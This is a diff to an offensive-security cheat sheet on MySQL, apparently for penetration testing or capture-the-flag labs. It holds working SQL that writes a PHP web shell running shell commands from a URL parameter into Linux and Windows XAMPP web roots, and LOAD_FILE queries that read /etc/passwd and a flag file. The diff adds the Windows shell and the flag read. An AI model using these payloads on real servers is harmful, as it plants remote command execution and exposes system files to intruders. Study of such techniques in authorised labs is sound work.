@@ -25,12 +25,14 @@ SELECT user, authentication_string FROM mysql.user WHERE user = 'root';
 Check value of `secure_file_priv` (empty is good, NULL is bad)
 ```sql
 show variables like "secure_file_priv";
-SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "C:/xampp/htdocs/dashboard/cmd.php";
 ```
 
 ##### Read Local Files
 ```sql
 select LOAD_FILE("/etc/passwd");
+select LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
 ```
 `MySQL` is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval.
 
